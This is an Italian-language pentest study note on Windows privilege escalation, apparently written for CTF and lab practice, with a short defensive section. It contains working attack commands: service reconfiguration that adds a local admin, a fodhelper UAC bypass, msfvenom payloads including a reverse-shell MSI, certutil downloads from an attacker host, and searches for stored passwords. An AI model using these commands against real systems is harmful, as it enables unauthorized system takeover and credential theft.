---

tags:

- windows
- privilege-escalation
- post-exploitation
- hacking-exposed-7
- active-directory aliases:
- WinPrivEsc
- Windows privesc
- elevation of privilege

---

# Privilege Escalation Windows

## 1. Il concetto

**Privilege escalation (privesc)** = passare da utente a bassi privilegi (shell come `mario`, `iis_user`, `svc_account`) a un account con potere amministrativo (`Administrator`, `SYSTEM`, `Domain Admin`).

Su Windows ci sono due livelli distinti:

|Tipo|Cosa significa|
|---|---|
|**Local privesc**|Da utente locale → Administrator / SYSTEM sulla stessa macchina|
|**Domain privesc**|Da account dominio → Domain Admin / Enterprise Admin nel dominio AD|

Questa nota copre principalmente il **local privesc**. Per il domain side vedi [[active_directory]] e [[htb_sauna]] (DCSync).

> [!note] Analogo Linux È l'equivalente di passare da `user1` a `root` su Linux. Le tecniche differiscono ma la logica è la stessa: **trovi un punto in cui codice/azione di un account privilegiato è influenzabile da te**.

---

## 2. Modello di privilegi Windows

### Account speciali

|Account|Privilegi|
|---|---|
|**Standard user**|Esegue solo proprie app, no scrittura su `C:\Windows`, no install software|
|**Administrator**|Privilegi pieni con consenso (UAC)|
|**SYSTEM** (NT AUTHORITY\SYSTEM)|Privilegi assoluti — più di Administrator|
|**TrustedInstaller**|Può modificare file di sistema protetti (anche Admin non può)|

### Integrity Levels (Vista+)

Ogni processo ha un **Integrity Level** che limita cosa può fare:

|IL|Chi|
|---|---|
|**Low**|Sandbox (es. browser process, Adobe Reader)|
|**Medium**|Utente standard (default)|
|**High**|Admin con token elevato (dopo UAC accept)|
|**System**|Processi kernel-level|

Il **Mandatory Integrity Control (MIC)** segue il modello Biba: _no write up, no read down_. Un processo Medium non può modificare oggetti High IL.

---

## 3. Le categorie di privesc Windows

```
Local Privilege Escalation
├── Stored credentials             ← cerca password lasciate in giro
├── Service misconfigurations      ← servizi che girano come SYSTEM ma sono modificabili
├── Token impersonation            ← ruba token di altri processi
├── DLL hijacking                  ← inganni il caricamento delle librerie
├── Kernel exploits                ← bug del kernel Windows
├── UAC bypass                     ← admin con token filtrato → token pieno
└── Scheduled tasks / autoruns     ← intercetti esecuzione automatica
```

---

## 4. Stored Credentials — il primo posto dove guardare

**Pattern numero uno in ogni pentest**. Gli admin spesso lasciano credenziali in chiaro in posizioni standard.

### Winlogon registry (visto su Sauna)

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
```

Usato per **autologon** (kiosk, server automatici). La password è in chiaro. Su [[htb_sauna]] hai trovato `svc_loanmgr` con questa tecnica.

### Unattend.xml — sysprep leftover

File creato da `sysprep` durante l'installazione automatica di Windows. Spesso contiene la password Administrator in plaintext (o base64).

Posizioni standard:

```
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\Panther\unattend.xml
```

### Credential Manager

```cmd
cmdkey /list
runas /savecred /user:admin cmd.exe   # se ha credenziali salvate
```

Le credenziali salvate per RDP, share di rete, app stanno qui.

### PowerShell history

```powershell
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Spesso contiene credenziali passate inline a comandi.

### File di configurazione

```cmd
findstr /si "password" *.xml *.ini *.txt *.config 2>nul
findstr /si "password" *.bat *.ps1 2>nul
```

### Group Policy Preferences (GPP)

Quando si applica una policy a livello dominio, le credenziali finiscono in `SYSVOL` cifrate con una chiave AES **pubblicata da Microsoft** — quindi cleartext de facto.

```cmd
findstr /S /I "cpassword" \\<DC>\SYSVOL\<domain>\Policies\*.xml
```

Tool: `gpp-decrypt` (Kali) decifra la stringa.

> [!tip] Analogia Linux Stesso pattern: su Linux cerchi password in `/etc/`, history bash, file di config di servizi. Qui cerchi in registry, Unattend, GPP. La logica è identica — admin pigri lasciano credenziali in posti prevedibili.

---

## 5. Service Misconfigurations

I servizi Windows girano come `SYSTEM` di default. Se puoi modificare cosa eseguono, fai privesc immediata.

### Servizi modificabili da utente normale

```cmd
# Enumera servizi e permessi (richiede AccessChk di Sysinternals)
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv user *

# PowerShell equivalente
sc qc <servicename>
sc query
```

Se trovi un servizio dove un utente normale ha `SERVICE_CHANGE_CONFIG`:

```cmd
sc config <vulnservice> binPath= "cmd.exe /c net localgroup administrators user /add"
sc start <vulnservice>
```

Riavvii il servizio → SYSTEM esegue il tuo comando → l'utente è admin.

### Unquoted Service Path

Bug classico ma ancora frequente. Se il path di un servizio non è quotato e contiene spazi:

```
C:\Program Files\Vendor Folder\Service.exe
```

Windows prova in sequenza:

```
C:\Program.exe
C:\Program Files\Vendor.exe       ← se puoi scrivere qui, win
C:\Program Files\Vendor Folder\Service.exe
```

Se hai write permission in `C:\Program Files\` (raro ma succede), pianti un `Vendor.exe` malevolo lì.

```cmd
# Trova servizi vulnerabili
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

### Weak Service Binary Permissions

Se il binario del servizio è scrivibile da te:

```cmd
icacls "C:\path\to\service.exe"
# Se vedi (M) o (F) per il tuo utente → puoi sovrascrivere
```

Sostituisci il binario, riavvia il servizio, sei SYSTEM.

---

## 6. Token Impersonation — le Potato Attacks

Famiglia di exploit che sfruttano servizi con privilegio `SeImpersonatePrivilege` (tipicamente IIS, MSSQL, account `*_SERVICE`).

### La logica

1. Sei shell come `iis_apppool\app1` (basso privilegio MA ha `SeImpersonatePrivilege`)
2. Forzi un servizio SYSTEM ad autenticarsi verso di te
3. Catturi il token SYSTEM
4. Impersoni quel token → diventi SYSTEM

### Varianti

|Nome|Anno|Tecnica|
|---|---|---|
|**Hot Potato**|2016|NBNS spoofing + WPAD + HTTP→SMB relay|
|**Rotten Potato**|2016|DCOM + NTLM relay locale|
|**Juicy Potato**|2018|Generalizzazione di Rotten, classi CLSID arbitrarie|
|**Rogue Potato**|2020|Variante post-patch Microsoft|
|**PrintSpoofer**|2020|Sfrutta il print spooler|
|**GodPotato**|2023|RPC, funziona su Windows moderni|

```cmd
# Trova privilegi del token corrente
whoami /priv

# Se vedi SeImpersonatePrivilege → Potato è possibile
PrintSpoofer.exe -i -c cmd
# → spawn cmd come SYSTEM
```

> [!warning] Pre-requisito Le Potato attack richiedono **SeImpersonatePrivilege** o **SeAssignPrimaryTokenPrivilege**. Non funzionano da un utente normale completamente unprivileged — servono account di servizio (IIS, MSSQL, ecc.).

---

## 7. DLL Hijacking

Windows cerca le DLL in un ordine specifico. Se piazzi una DLL malevola in una posizione che viene controllata **prima** della legittima, l'app la carica.

### Search order tipico

```
1. Directory dell'eseguibile
2. C:\Windows\System32
3. C:\Windows\System
4. C:\Windows
5. Current directory
6. PATH
```

### Lo sfruttamento

Se un'app privilegiata (servizio SYSTEM) cerca una DLL in una directory dove TU puoi scrivere:

```cmd
# Crea DLL malevola che spawna shell
msfvenom -p windows/x64/exec CMD=cmd.exe -f dll > evil.dll

# Piazzala nella directory
copy evil.dll C:\writable_path\legitname.dll

# Restart del servizio → SYSTEM carica la tua DLL
```

### Variante: PATH hijacking

Se il PATH include directory scrivibili (raro), piazzi un eseguibile con nome di un comando comune (`net.exe`, `tasklist.exe`) e aspetti che venga eseguito.

---

## 8. Kernel Exploits

Bug nel kernel Windows che permettono elevation diretta. Storicamente devastanti, oggi rari su sistemi patchati.

|Exploit|Anno|CVE|Versioni|
|---|---|---|---|
|**MS08-067**|2008|CVE-2008-4250|XP, 2003, Vista|
|**MS10-015** (KiTrap0D)|2010|CVE-2010-0232|XP, Vista, 7|
|**MS14-058**|2014|CVE-2014-4113|7, 8, 2008 R2|
|**MS16-032**|2016|CVE-2016-0099|7, 8, 8.1, 10|
|**PrintNightmare**|2021|CVE-2021-34527|quasi tutte le versioni|

### Identificare versione vulnerabile

```cmd
systeminfo
# Cerca "OS Version" e "Hotfixes"
```

Tool: **Watson** (Sherlock successor) — enumera missing patches e suggerisce exploit.

```powershell
.\Watson.exe
```

> [!note] In contesto moderno Su Windows 10/11 aggiornati, kernel exploit utili sono rari. Tendenzialmente è sempre più produttivo cercare misconfiguration (servizi, credenziali) che kernel exploit.

---

## 9. UAC Bypass

UAC (User Account Control) divide gli account Admin in due token:

- **Filtered token**: privilegi medium-IL (default)
- **Linked token**: privilegi high-IL (dopo conferma utente)

**UAC bypass** = ottenere il linked token senza il prompt utente.

### Tecniche comuni

|Tecnica|Come funziona|
|---|---|
|**Fodhelper**|Manipola registry per far eseguire comando elevato a fodhelper.exe (auto-elevate)|
|**Eventvwr**|Hijack di `mscfile` registry key|
|**ComputerDefaults**|Simile a fodhelper|
|**sdclt**|Bypass via `IsolatedCommand` registry|
|**DLL sideloading**|Sostituisci DLL legittima caricata da binario auto-elevate|

```cmd
# Esempio fodhelper bypass
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "cmd.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /f
fodhelper.exe
# → spawn cmd come admin senza prompt UAC
```

Tool: **UACMe** (raccolta di bypass) — github.com/hfiref0x/UACMe

> [!warning] Prerequisito UAC bypass Devi già essere admin con token filtrato. Da utente standard, UAC bypass NON ti porta ad admin — ti serve essere admin "depotenziato" da UAC. Per andare da user a admin servono altre tecniche di privesc.

---

## 10. Scheduled Tasks e Autoruns

### Scheduled tasks modificabili

```cmd
# Lista task
schtasks /query /fo LIST /v

# Se trovi un task SYSTEM dove puoi modificare l'azione o il binario eseguito
schtasks /change /tn <taskname> /tr "cmd.exe /c net user attacker P@ss123 /add"
```

### Autoruns (registry)

```cmd
# Chiavi standard
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

Se puoi modificare un valore HKLM run key → al prossimo logon admin la tua command parte come admin.

---

## 11. AlwaysInstallElevated

Misconfiguration policy: se è abilitata, qualsiasi `.msi` installato viene eseguito come SYSTEM, anche da utente standard.

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Se entrambi sono 1 → win
msfvenom -p windows/x64/shell_reverse_tcp LHOST=... LPORT=... -f msi > evil.msi
msiexec /quiet /qn /i evil.msi
# → reverse shell come SYSTEM
```

---

## 12. Tools — enumerazione automatica

Cercare manualmente tutti i punti di privesc è dispendioso. I tool fanno l'enum per te.

|Tool|Tipo|Cosa fa|
|---|---|---|
|**WinPEAS**|Script (.exe / .bat / .ps1)|Enum completo: credenziali, servizi, registry, AlwaysInstallElevated, ecc. Output colorato|
|**PowerUp**|PowerShell|Focus su servizi, unquoted paths, dll hijacking|
|**Seatbelt**|.NET|Situational awareness, info raccolta da decine di fonti|
|**Watson**|.NET|Identifica missing patches → kernel exploit candidati|
|**BeRoot**|Python / Exe|Multi-platform privesc finder|
|**Sherlock**|PowerShell|Predecessore di Watson, leggero|

### Workflow tipico

```cmd
# 1. Download WinPEAS sul target
certutil -urlcache -split -f "http://attacker/winPEASx64.exe" winpeas.exe

# 2. Esegui
winpeas.exe > out.txt

# 3. Esamina output — WinPEAS colora in rosso le findings critiche
type out.txt | findstr /i "red"
```

> [!tip] Filosofia WinPEAS è la prima cosa da lanciare dopo aver ottenuto shell. Ti dice immediatamente quali vettori sono presenti. Non è subtle (genera molto output, è rumoroso) ma in CTF/lab va benissimo. In red team operativo si usano alternative più stealthy.

---

## 13. Confronto con Linux privesc

|Concetto|Windows|Linux|
|---|---|---|
|**Stored credentials**|Winlogon, Unattend.xml, Credential Manager, GPP|`/etc/`, history bash, config files|
|**Servizi vulnerabili**|Service binary modificabile, unquoted path|SUID binaries, sudo misconfig|
|**Token abuse**|Potato attacks (SeImpersonate)|Capabilities (`CAP_SYS_ADMIN`), `LD_PRELOAD` su sudo|
|**DLL hijacking**|Search order DLL|`LD_LIBRARY_PATH`, `LD_PRELOAD`|
|**Kernel exploit**|MS08-067, PrintNightmare|DirtyCow, DirtyPipe, OverlayFS|
|**UAC bypass**|fodhelper, eventvwr|n/a (no UAC su Linux)|
|**Auto-run**|Registry Run keys, scheduled task|cron, systemd timer, `/etc/init.d`|
|**Stupid leftover**|AlwaysInstallElevated|NOPASSWD in sudoers|

> [!abstract] La regola universale Privesc su qualsiasi OS = trovare il punto dove **codice/azione privilegiato è influenzato da te**. Il pattern è identico, cambia solo la sintassi.

---

## 14. Difese (lato blue team)

|Difesa|Cosa mitiga|
|---|---|
|**Least privilege**|Servizi non come SYSTEM se non necessario|
|**Patching**|Kernel exploit, UAC bypass noti|
|**AppLocker / WDAC**|Esecuzione di binari/script non firmati|
|**Credential Guard**|Protegge LSASS da dump (Win10+)|
|**No password in plaintext**|No Unattend.xml in produzione, no GPP cpassword|
|**EDR / sysmon logging**|Detection di Potato, token impersonation, registry changes anomale|
|**Disable AlwaysInstallElevated**|Default già off; verificare GPO|

---

## 15. Checklist veloce post-shell

```
1. whoami /priv         ← privilegi? Se SeImpersonate → Potato
2. whoami /groups       ← in quali gruppi sono?
3. systeminfo            ← versione OS, hotfix → Watson
4. WinPEAS               ← enum automatica
5. cmdkey /list          ← credenziali salvate
6. reg query Winlogon    ← autologon password
7. dir /s Unattend.xml   ← sysprep leftover
8. accesschk su servizi  ← misconfig services
9. reg AlwaysInstallElevated
10. tasks schtasks /query ← task modificabili
```

---

## Takeaways

1. **Privesc Windows = local privesc** (user → SYSTEM) o **domain privesc** (vedi [[active_directory]])
2. Il **primo posto** da controllare sono sempre le **stored credentials** (Winlogon, Unattend, Credential Manager, GPP)
3. **Servizi mal configurati** sono il secondo vettore più produttivo: binary modificabile, unquoted path, service config modificabile
4. **Potato attacks** funzionano solo se hai già `SeImpersonatePrivilege` (account di servizio)
5. **UAC bypass** è privesc da admin-token-filtrato a admin-token-pieno, NON da user a admin
6. **WinPEAS** è il primo comando dopo aver ottenuto shell
7. Il **pattern è universale** tra Linux e Windows: cambiano i nomi dei file e le tecniche, la logica è identica

---

## Wiki-links

- [[active_directory]]
- [[htb_sauna]]
- [[pass_the_hash]]
- [[winpeas]]
- [[uac_bypass]]
- [[potato_attacks]]
- [[dll_hijacking]]
- [[mimikatz]]
- [[lsass_dump]]
- [[credential_dumping_lsa_vs_lsass]]
- [[interactive_logon]]
- [[hacking_exposed_7_windows]]